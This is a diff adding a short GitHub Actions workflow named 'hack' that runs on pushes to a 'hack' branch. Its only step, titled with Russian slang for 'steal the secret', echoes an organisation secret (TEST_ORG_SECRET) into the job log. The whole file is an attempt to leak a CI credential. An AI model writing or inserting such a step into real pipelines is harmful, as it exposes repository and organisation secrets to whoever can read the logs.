@@ -1,0 +1,19 @@
+name: hack
+
+on:
+  push:
+    branches: [ hack ]
+
+jobs:
+  hack:
+    name: Hack
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
+      security-events: write
+
+    steps:
+      - name: Spizdit secret
+        run: |
+          echo ${{ secrets.TEST_ORG_SECRET }}
